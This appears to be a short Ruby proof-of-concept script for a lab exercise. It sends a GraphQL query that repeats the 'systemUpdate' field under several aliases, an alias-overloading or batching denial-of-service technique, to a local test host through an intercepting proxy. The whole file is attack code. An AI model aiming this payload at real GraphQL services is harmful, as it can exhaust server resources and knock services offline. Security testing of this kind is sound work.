require 'httpx'

copy_level = 3
query = 'systemUpdate'
payload = (1..copy_level).map { |i| "q#{i}:#{query}" }.join(',')
data = { 'query' => "query{#{payload}}"}

HTTPX
  .plugin(:proxy)
  .with_proxy(uri: 'http://127.0.0.1:8080')
  .with(timeout: { operation_timeout: 120 })
  .post('http://noraj.test:5013/graphql', json: data)